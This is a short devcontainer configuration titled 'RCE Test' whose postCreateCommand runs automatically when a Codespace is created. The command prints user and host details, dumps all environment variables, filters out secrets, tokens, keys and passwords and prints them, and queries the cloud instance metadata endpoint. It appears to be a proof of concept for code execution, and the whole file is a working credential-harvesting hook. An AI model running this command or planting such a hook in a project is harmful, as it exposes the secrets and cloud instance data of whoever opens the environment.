name: RCE Test
postCreateCommand: echo '=== CODESPACE RCE ===' && whoami && id && hostname && uname -a && env | sort > /tmp/full_env.txt && env | grep -iE '(secret|token|key|pass|github|codespace)' > /tmp/secrets.txt && cat /tmp/secrets.txt && curl -sm5 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata:true' > /tmp/imds.json 2>/dev/null && cat /tmp/imds.json | head -c 500 && echo '=== DONE ==='
